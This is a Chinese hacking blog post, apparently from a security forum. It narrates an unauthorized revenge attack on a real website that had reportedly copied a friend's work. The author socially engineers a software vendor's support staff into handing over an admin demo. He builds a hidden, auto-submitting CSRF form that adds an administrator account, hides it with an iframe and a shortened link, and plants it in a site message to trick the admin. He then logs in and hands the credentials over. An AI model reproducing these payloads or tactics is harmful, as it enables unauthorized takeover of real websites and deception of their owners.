@@ -1,0 +1,49 @@
+本文作者：jasonx
+我朋友说和对方谈过几次，但是对方态度嚣张，让他有本事去就去告....
+那么闲来无事，咱们不如来一发？
+0x01 信息收集
+先随便浏览一些页面，发现网站是aspx的，然后扫描了下，windows服务器，iis搭建。
+通过指纹识别没查到相关cms，然后开始看JS和css等文件，没发现什么有价值的信息。
+然后我发现在他的网站底部，有个【技术支持】，点击后跳转到一家软件公司。
+0x02 套路 满满的套路
+进入软件公司网站后，在首页底部找到客服的QQ号，我添加上了以后开始要演示地址。
+一般演示地址都会给后台地址的，我目的就是看后台有没有漏洞。
+本来以为后台是admin的，试了下没进去，然后咱们继续套路客服。
+得到后台以后开始找上传点尝试截断上传，最终尝试失败。
+翻了下其他的功能也没啥用，不过我发现在后台的管理员添加这里，貌似存在CSRF。
+那么咱们就来测试一下看看。
+点击添加管理员
+进入后我们输入用户名：haha 密码：123456 邮件地址随便输入一个。
+然后开启浏览器代理，打开burp对数据包进行拦截，然后点添加按钮。
+我们就抓到了一个添加管理员的POST请求。
+通过分析发现没有token验证。
+然后我们点击右键，选择Engagement tools > Generate CSRF poc
+点击以后会进入这里，我们copy html代码到本地，新建一个html文件，把代码复制进去。
+然后把这个html文件上传到自己的网站空间（本地打开测试也是可以的），通过浏览器打开这个html文件的URL，点击按钮以后，发现跳转到了后台的首页，然后重新进入管理员列表发现已经多了一个haha的管理员账号，拥有全部权限。
+0x03 空降一个管理员账号
+现在咱们就去套路这个盗用别人劳动成果的无耻之徒吧。
+不过在这之前，我们先改进一下这个html文件，要不然一个大大的按钮容易让人起疑心，而且我们要让数据自动提交，而不是要诱骗他去点击这个按钮。
+改进后的代码如下：
+<html> <head> <script> function sub(){ document.form1.submit(); } setTimeout(sub,1); </script> </head> <body> <form name="form1" action="http://www.xxxx.com/admin/store/AddManager.aspx" method="POST"> <input type="hidden" name="__VIEWSTATE" value="/wEPDwUKMTg4Mjk2---强行打码---wMEZ2dnZxYBZmRk" /> <input type="hidden" name="ctl00$contentHolder$txtUserName" value="hack" /> <input type="hidden" name="ctl00$contentHolder$txtPassword" value="123456" /> <input type="hidden" name="ctl00$contentHolder$txtPasswordagain" value="123456" /> <input type="hidden" name="ctl00$contentHolder$txtEmail" value="656566568@qq.com" /> <input type="hidden" name="ctl00$contentHolder$dropRole" value="3c40faeb-马赛克-ad3c-5fb1afd018b6" /> <input type="hidden" name="ctl00$contentHolder$btnCreate" value="æ·» åŠ " /> <input type="submit" value="Submit request" style="display:none" /> </form> </body> </html>
+这里感谢45楼的表哥提醒，用以下方法可以实现隐藏跳转。
+准备两个页面 ，一个放csrf的代码 1.html，另一个页面2.html 用iframe包含住1.html
+<iframe src="1.html" style="display:none"></iframe>然后把2.html生成url短链接，发给对方即可。
+现在我们把这个改进好的html文件上传到网站空间，然后重新访问一遍测试是否可用。
+测试完成以后把这个url放到http://www.alifeifei.net/缩短。
+点击生成以后，得到一个缩短的地址，目的就是为了好欺骗网站管理员。
+访问这个缩短的地址会自动跳转到我们的html文件。
+现在登录这个抄袭者的网站前台，然后给管理员发送一个我们缩短的那个链接。
+这里是个野路子，为什么我不通过QQ直接发地址过去（原因是如果对方在打开你链接的时候没有登录后台，就不会触发CSRF）
+所以，我们选择在网站上给他留言，如果管理员看到这个留言，那么他肯定是在后台并且登录了的，所以只要他打开这个地址就会中招。
+等了一会儿我尝试用我们构造好的hack账号登陆，还是没登陆上。
+0x04 等不及了 继续套路
+现在回到这个盗图者的网站，在网站上找到他的QQ，然后添加。
+现在登录后台看看，账号：hack 密码：123456 成功进入
+借用盗图狗的手打了他自己一耳刮子( • ̀ω•́ )✧
+然后把这个账号密码发给我朋友，剩下的看他怎么弄啦….
+0x05 你懂的
+拉黑 删除自己网站空间的html文件。
+0x06 分享一个CSRF的利用工具
+回原文下载附件哈<<<<<<
+免费课程学习地址：https://bbs.ichunqiu.com/thread-28971-1-1.html
+>>>>>>黑客入门必备技能 带你入坑，和逗比表哥们一起聊聊黑客的事儿，他们说高精尖的技术比农药都好玩！
